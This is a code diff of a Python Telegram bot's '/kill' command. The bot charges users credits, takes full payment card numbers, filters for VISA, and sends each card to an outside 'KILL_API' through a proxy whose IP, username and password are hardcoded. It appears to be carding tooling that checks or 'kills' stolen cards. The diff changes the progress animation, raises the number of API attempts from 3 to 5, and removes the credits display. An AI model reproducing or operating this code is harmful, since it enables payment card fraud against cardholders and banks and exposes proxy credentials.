@@ -2564,10 +2564,9 @@ KILL_API = (
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
 )
 
-COOLDOWN = 5  # 5 seconds cooldown
-ANIM_TEXT = "𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙤𝙣 𝙄𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜..."
-ANIM_STEP_DELAY = 0.7  # speed of animation per letter
-user_cooldowns = {}  # user_id: timestamp
+COOLDOWN = 5
+ANIM_STEP_DELAY = 0.7
+user_cooldowns = {}
 
 # --- Consume credits ---
 async def consume_credit(user_id: int):
@@ -2578,12 +2577,11 @@ async def consume_credit(user_id: int):
         return True
     return False
 
-# --- /kill command handler ---
+# --- /kill handler ---
 async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     now = time.time()
 
-    # --- Cooldown check ---
     last_used = user_cooldowns.get(user_id, 0)
     if now - last_used < COOLDOWN:
         await update.message.reply_text(
@@ -2595,12 +2593,13 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_cooldowns[user_id] = now
     asyncio.create_task(_kill_task(update, context, user_id))
 
+
 # --- Main task ---
 async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
     try:
         start_time = time.time()
 
-        # --- Get card from args or reply ---
+        # --- Get card ---
         if context.args:
             cc = context.args[0].strip()
         elif update.message.reply_to_message and update.message.reply_to_message.text:
@@ -2625,7 +2624,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             country_name = "Unknown"
             country_flag = ""
 
-        # --- Unsupported cards ---
+        # --- Only VISA ---
         if brand.upper() in ["AMEX", "MASTERCARD"]:
             await update.message.reply_text(
                 f"⚠️ {brand} detected!\n❌ /kill only supports VISA cards.",
@@ -2642,7 +2641,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             )
             return
 
-        # --- Send initial progress message ---
+        # --- Initial message ---
         msg = await update.message.reply_text(
             "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
             "<pre><code></code></pre>\n"
@@ -2651,35 +2650,38 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             disable_web_page_preview=True
         )
 
-        # --- Animate the "Killing The card..." text ---
-        async def _animate_typing(msg):
+        # --- Animate typing ---
+        async def _animate(msg):
             try:
-                full = ANIM_TEXT
-                pos = 0
-                while True:
-                    pos = (pos + 1) if pos < len(full) else 0
-                    shown = full[:pos]
-                    text = (
-                        "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
-                        f"<pre><code>{escape(shown)}</code></pre>\n"
-                        "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫"
-                    )
-                    try:
-                        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-                    except TelegramError:
-                        pass
-                    await asyncio.sleep(ANIM_STEP_DELAY)
+                anim_texts = [
+                    "⚡𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙤𝙣 𝙄𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜...",
+                    "𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧...",
+                    "𝙖 𝙬𝙝𝙞𝙡𝙚..."
+                ]
+                for anim_text in anim_texts:
+                    for i in range(len(anim_text)+1):
+                        shown = anim_text[:i]
+                        text = (
+                            "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
+                            f"<pre><code>{escape(shown)}</code></pre>\n"
+                            "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫"
+                        )
+                        try:
+                            await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+                        except TelegramError:
+                            pass
+                        await asyncio.sleep(ANIM_STEP_DELAY)
             except asyncio.CancelledError:
                 return
 
-        anim_task = asyncio.create_task(_animate_typing(msg))
+        anim_task = asyncio.create_task(_animate(msg))
 
         api_url = KILL_API.format(full_card=cc)
         final_status = None
         display_response = ""
 
         async with aiohttp.ClientSession() as session:
-            for attempt in range(3):  # Check card 3 times
+            for attempt in range(5):  # check 5 times
                 try:
                     async with session.get(api_url, timeout=55) as resp:
                         data = await resp.json()
@@ -2701,16 +2703,15 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
 
         # --- Stop animation ---
         anim_task.cancel()
-        await asyncio.sleep(0.1)  # allow cancel
+        await asyncio.sleep(0.1)
 
         elapsed_time = round(time.time() - start_time, 1)
         escaped_card = escape(cc[:6] + "******" + cc[-4:])
-        remaining_credits = (await get_user(user_id)).get("credits", 0)
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
-        # --- Send final message ---
+        # --- Final message ---
         final_text = (
             f"<b><i>{final_status}</i></b>\n\n"
             f"𝐂𝐚𝐫𝐝\n⤷ <code>{escaped_card}</code>\n"
@@ -2720,7 +2721,6 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
             f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
             f"</pre>\n\n"
-            f"𝐂𝐫𝐞𝐝𝐢𝐭𝐬 ➵ {remaining_credits}\n"
             f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
             f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
         )
@@ -2733,6 +2733,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             parse_mode=ParseMode.HTML
         )
         print(f"[ERROR] /kill task failed: {e}")
+
 
 
 
